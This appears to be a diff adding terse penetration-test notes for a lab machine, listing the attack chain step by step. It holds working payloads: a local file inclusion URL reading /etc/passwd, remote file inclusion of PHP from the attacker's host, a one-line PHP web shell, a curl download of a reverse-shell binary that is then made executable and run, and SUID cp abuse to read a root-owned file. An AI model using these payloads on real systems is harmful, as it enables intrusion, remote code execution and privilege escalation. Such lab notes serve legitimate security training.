@@ -1,0 +1,27 @@
+# 1 found a user name
+Justin
+Bob
+
+# 2 found LRI vulnerability
+http://10.11.1.35/section.php?page=../../../../../../../etc/passwd
+
+# found sus user name
+polkitd 
+chrony
+
+# 3 found RFI vulnerability
+http://10.11.1.35/section.php?page=http://192.168.119.191:9000/test.php
+<?php phpinfo(); ?> 
+
+# 4 found code can be exectued by RFI
+http://10.11.1.35/section.php?page=http://192.168.119.191:9000/shell.php&cmd=whoami
+<?php echo shell_exec($_GET['cmd']); ?>
+
+# 5 execute reverse shell with given approach to obtain the reverse shell
+curl http://192.168.119.191:9000/shell.elf > /tmp/shell.elf
+chmod 777 /tmp/shell.elf
+./tmp/shell.elf
+
+# 6 found `cp` has suid bit set
+cp /root/proof.txt /dev/stdout
+
